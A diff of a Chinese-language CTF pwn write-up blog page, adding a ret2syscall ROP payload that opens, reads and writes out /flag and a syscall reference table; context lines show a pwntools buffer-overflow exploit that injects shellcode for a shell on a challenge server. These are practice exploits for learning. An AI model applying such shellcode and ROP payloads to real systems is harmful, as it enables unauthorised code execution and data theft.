@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://isolator-1.github.io/img/ciscn_2019_n_5/3.jpg">
 <meta property="og:image" content="https://isolator-1.github.io/img/ciscn_2019_n_5/4.jpg">
 <meta property="article:published_time" content="2022-11-16T11:07:00.000Z">
-<meta property="article:modified_time" content="2023-10-29T05:57:04.619Z">
+<meta property="article:modified_time" content="2023-11-09T12:15:49.087Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta property="article:tag" content="exp">
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.9k words
+          7.5k words
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          58 mins
+          63 mins
         
       </span>
     
@@ -340,6 +340,63 @@
 <p>而且特意看了一下 <code>len(shellcode) </code>是 48 &lt; 100字节</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27829</span>)<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>p.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+<h3 id="题目7"><a href="#题目7" class="headerlink" title="题目7"></a>题目7</h3><p>发现没有写过ret2syscall的题目，记录一下方便忘了再看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>-<span class="hljs-number">6</span>) + p64(pop_rdi)+p64(buf)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)\<br>    + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) \<br>    + p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) +p64(pop_rsi) + p64(buf+<span class="hljs-number">0x10</span>) \<br>    +p64(pop_rdx)+p64(<span class="hljs-number">0x32</span>) +p64(pop_rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)+ p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) \<br>    + p64(buf+<span class="hljs-number">0x10</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x90</span>) + p64(pop_rax) + p64(<span class="hljs-number">1</span>) +p64(syscall)<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">%rax</th>
+<th align="left">System call</th>
+<th align="left">%rdi</th>
+<th align="left">%rsi</th>
+<th align="left">%rdx</th>
+<th align="left">%r10</th>
+<th align="left">%r8</th>
+<th align="left">%r9</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0</td>
+<td align="left">sys_read</td>
+<td align="left">unsigned int fd</td>
+<td align="left">char *buf</td>
+<td align="left">size_t count</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">1</td>
+<td align="left">sys_write</td>
+<td align="left">unsigned int fd</td>
+<td align="left">const char *buf</td>
+<td align="left">size_t count</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">sys_open</td>
+<td align="left">const char *filename</td>
+<td align="left">int flags</td>
+<td align="left">int mode</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">sys_close</td>
+<td align="left">unsigned int fd</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
 
                 
               </div>
